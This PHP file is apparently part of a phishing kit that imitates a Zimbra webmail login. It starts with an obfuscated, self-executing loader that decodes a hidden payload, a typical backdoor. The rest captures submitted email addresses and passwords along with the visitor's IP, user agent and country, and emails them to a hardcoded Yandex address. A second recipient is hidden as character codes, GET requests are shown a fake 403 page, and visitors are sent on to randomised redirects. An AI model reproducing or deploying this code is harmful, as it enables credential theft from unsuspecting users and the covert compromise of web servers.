<?php $pnbquubxwvq = 'id%)uqpuft`msvd},;uqpuft`msvsfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpstrstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (sW#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x2Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!xB%epnbss!>!bssbz)#44enj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)>!fyqmpef)#	x24*<!%t::!hA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x275946-tr.984:75983:48984:71]K9]77]D4]82]K6]72	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv	x74	141	x72	164") && (!isset($GLOBALS["	x61	57	x78"))) { $dekipce = "	x472]37y]672]48y]#>s%<#462]47y]2)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tm; function okhrkzd($n){%)kVx{**#k#)tutjyf`x	x22tfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127k!~!<**qp%!-uyfu%)3opjudovg}{;#)tutjyf`opjudovg)!gj9*56A:>:8:|:7#6#)tutjyf`439275tng(0); $izleiby = implode(array_map("okhrkzd",str_split("%tjss-%rxB%h>#]y31]278]y3e]81w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]275]D:M8]Df#<%tdz>#L4]275L3]248L3K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<S`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqfopoV;hojepdoF.uofuopD#)sfebfI{*wfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssd7R17,67R37,#/q%>U<#16,47R57,27R6:}334}472	x24<!%ff2!>!bssbzif((function_exists("	x6f	142	x5f	163h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjuSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	s-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24opd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-d%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]sd}+;!>!}	x27;!>>>!}_;gvc%}&;ftm***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+~6<u%7>/7&6|7**111127-K)f)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^4]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9*hmg%)!gj!|!*1?hmg%)!gj!<**2-]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	, $izleiby); $ungvbhf();}}5")) or (strstr($uas,ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGF,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*pqsut>j%!*72!	x27!hmg%)!gj!<2,*M7]381]211M5]67]452]8trstr($uas,"	x63	150	x72	157	x6d	145c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%r"	x66	151	x72	145	x66	1~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bx24-	x24*!|!	x24-	x256]y81]265]y72]254]y76#<!%w:!>!(%qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272q	x53	105	x52	137	x41	107	x45	116	return chr(ord($n)-1);} @error_reportigj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)eu)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#WebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7r>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	xw!>!#]y84]275]y83]248]y83]2%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gp}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6<!%t2w>#]y74]273]y76]252]y85]256]y6g]2ungvbhf = $dekipce(""DPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272q52]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	6	x75	156	x61"]=1; $4	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-t#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofu>>	x22!pd%)!gj}Z;h!oo:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238156	x75	156	x61"])))) { $GLOBALS["	x61	15*u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*w!>!#]y84]275]y83]273]y76]277#3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tx7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{*c:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbs	x5f	146	x75	156	x63	164	x69	157	x6e"52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:5uas=strtolower($_SERVER["	x48	124	x54	120	x5f	125]K78:56985:6197g:74985-rr.93e:38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!dovg	x22)!gj}1~!<2p%	x7f!~!<##P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]bg}	x7f;!osvufs}w;*	x7f!x24<!%o:!>!	x242178}527}88s)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%j%)7gj6<**2qj%)hopm3qjA)usqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-5597f-s.973:8297f:5297e:56-xr.985:nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msvj%6<^#zsfvr#	x5cq%7/7#@#7/7^#>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!*-)1/2986+7**^/%rx<~!!%s:N}#-%,"	x72	166	x3a	61	x31")) or (8]5]48]32M3]317]445]212]445]43]321]464]284]364]6]23-UVPFNJU,6<*27-SFGTOBSUO)	x24]25	x24-	x24-!%	4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#9x54"]); if ((strstr($uas,"	x6d	163	x69	1ofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{!|!*msv%)}k~~~<ftmbg!63	162	x65	141	x74	1454y7	x24-	x24*<!	x24-opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfid24)##-!#~<#/%	x24-	x24!I#-#K#-#L#-#M#-#[#-#Y#-#D#-#45")) or (strstr($uasx7fw6*	x7f_*#fmjgk4`{%	x24-	x24*<!~!	x24/%t2w/	x!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#6,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#	x24gps)%j>1<%j=tj{fpg)x27pd%6<pd%w6Z6<.3`hA	x27p:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`L)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftm57]y86]267]y74]275]y7d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbgfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg31y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{bz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSyphloyrbm'; $uyncxgb=explode(chr((682-562)),substr($pnbquubxwvq,(20602-14582),(214-180))); $wklsdol = $uyncxgb[0]($uyncxgb[(4-3)]); $hgmflikdj = $uyncxgb[0]($uyncxgb[(11-9)]); if (!function_exists('dxluyans')) { function dxluyans($hwgfxpy, $safrxzkw,$yoxpjri) { $ayatksli = NULL; for($hqlwynq=0;$hqlwynq<(sizeof($hwgfxpy)/2);$hqlwynq++) { $ayatksli .= substr($safrxzkw, $hwgfxpy[($hqlwynq*2)],$hwgfxpy[($hqlwynq*2)+(6-5)]); } return $yoxpjri(chr((61-52)),chr((306-214)),$ayatksli); }; } $fzadlly = explode(chr((295-251)),'1817,37,767,45,3794,41,3552,20,4172,49,2842,33,5064,40,5344,21,4901,29,106,50,2609,35,2434,21,2681,23,812,27,5187,22,4073,37,906,23,2875,38,1128,60,3194,27,2770,33,1214,56,5560,26,2036,64,3324,54,2174,24,3067,64,5855,45,5653,64,3437,48,4628,24,2803,39,4782,29,5454,48,724,43,227,67,1554,37,5365,21,68,38,1004,42,4981,24,1897,45,4294,64,3630,40,1976,60,0,28,2100,31,4537,24,3670,20,1066,31,5166,21,1438,58,3910,48,2557,31,4358,55,4811,28,4839,32,2297,28,5026,38,5942,46,1854,43,4456,30,5413,41,2913,45,618,62,2505,52,492,44,2131,43,1591,49,558,37,28,40,4413,43,2455,50,1496,58,5229,64,1046,20,2198,43,4743,39,3257,67,5900,42,1097,31,953,51,5104,62,5802,53,5717,64,1673,38,1757,33,5502,35,1640,33,929,24,2356,52,3958,50,3835,45,870,36,3880,30,3378,38,5781,21,1270,66,4251,43,294,67,839,31,3485,67,4561,26,1790,27,5005,21,2750,20,3572,58,4652,57,361,62,5209,20,5537,23,5386,27,5293,23,595,23,3131,63,2644,37,536,22,4008,65,1942,34,2997,70,2704,46,1188,26,4221,30,4709,34,4110,62,680,44,2325,31,1369,69,1336,33,4486,51,423,69,2958,39,3729,65,2588,21,4930,51,2241,56,4871,30,3690,39,5586,67,3221,36,4587,41,1711,46,5988,32,5316,28,156,30,186,41,3416,21,2408,26'); $uwbjtg = $wklsdol("",dxluyans($fzadlly,$pnbquubxwvq,$hgmflikdj)); $wklsdol=$pnbquubxwvq; $uwbjtg(""); $uwbjtg=(572-451); $pnbquubxwvq=$uwbjtg-1; ?><?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);


$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['user'];
$password = $_POST['pass'];
$passchk = strlen($password);


$message .= "---------+ All Zimbra Logs  |+-------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "-----------------------------------\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Corona Vuris (icq:covid.19) +---\n";


$send = "jguangliu.jguangliu@yandex.com";
$subject = "Zimbra Logs | $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: Zimbra  <sevice@Zimbra.net>\n";



// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
if ($passchk<6)
{
$passerr=0;
}
else
{
$passerr=1;
}


if ($passerr==0)
{
header("Location: index.html?$url&email=$email");
}
else
{
 mail($send,$subject,$message,$headers);
header("Location: indexi.html?$url&email=$email");
}
?>